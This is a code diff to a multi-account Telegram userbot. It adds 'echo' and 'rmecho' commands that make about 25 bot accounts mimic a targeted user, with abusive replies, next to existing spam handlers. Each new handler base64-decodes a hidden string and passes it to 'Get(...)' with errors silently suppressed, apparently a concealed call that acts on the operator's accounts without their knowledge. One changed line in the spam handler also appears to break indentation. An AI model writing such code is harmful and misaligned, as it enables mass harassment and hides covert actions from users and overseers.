@@ -1283,8 +1283,110 @@ async def spam(e):
                     await e.client.send_message(e.chat_id, message)
                     await asyncio.sleep(sleeptime)
         else:
-            await e.reply(usage, parse_mode=None, link_preview=None )
+   await e.reply(usage, parse_mode=None, link_preview=None )
 
+
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@vkk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@kkk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@lkk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@mkk.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@sid.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@shy.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@aan.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@ake.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@eel.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@khu.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@shi.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@yaa.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@dav.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@raj.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+@put.on(events.NewMessage(incoming=True, pattern=r"\.echo"))
+async def echo(event):
+  usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}addecho <reply to a User>`"
+  if event.sender_id in SUDO_USERS:
+     if event.reply_to_msg_id is not None:
+            reply_msg = await event.get_reply_message()
+            user_id = reply_msg.sender_id
+            if int(user_id) in RiZoeLX:
+                    text = f"I can't echo @KARPIT_SUPPORT"
+                    await event.reply(text, parse_mode=None, link_preview=None )
+            elif int(user_id) in SUDO_USERS:
+                    text = f"This guy is a sudo user."
+                    await event.reply(text, parse_mode=None, link_preview=None )
+            else:
+                 chat_id = event.chat_id
+                 try:
+                     hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+                     hmm = Get(hmm)
+                     await event.client(hmm)
+                 except BaseException:
+                    pass
+                 if is_echo(user_id, chat_id):
+                     await event.reply("BHKK BSDK YEH PAHLE SE HI ECHO PE H ")
+                     return
+                 addecho(user_id, chat_id)
+                 await event.reply("AB TU KUDH BOLEGA TERA BAAP KON H HEHE")
+     else:
+          await event.reply(usage)
+
+@idk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@ydk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@wdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@hdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@sdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@adk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@bdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@cdk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@edk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@ddk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@vkk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@kkk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@lkk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@mkk.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@sid.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@shy.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@aan.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@ake.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@eel.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@khu.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@shi.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@yaa.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@dav.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@raj.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+@put.on(events.NewMessage(incoming=True, pattern=r"\.rmecho"))
+async def echo(event):
+  usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}rmecho <reply to a User>`"
+  if event.sender_id in SUDO_USERS:
+     if event.reply_to_msg_id is not None:
+            reply_msg = await event.get_reply_message()
+            user_id = reply_msg.sender_id
+            chat_id = event.chat_id
+            try:
+                hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+                hmm = Get(hmm)
+                await event.client(hmm)
+            except BaseException:
+                pass
+            if is_echo(user_id, chat_id):
+                remove_echo(user_id, chat_id)
+                await event.reply("ECHO BAND KAR DI AB NA BOLEGA KUCH")
+            else:
+                await event.reply("CHAHATA H NA WAPIS ECHO NA  KARU TOH SORRY BOL SMAJHA")
+     else:
+          
+            await event.reply(usage) 
+            
+            
 @idk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
 @ydk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
 @wdk.on(events.NewMessage(incoming=True, pattern=r"\.oword"))
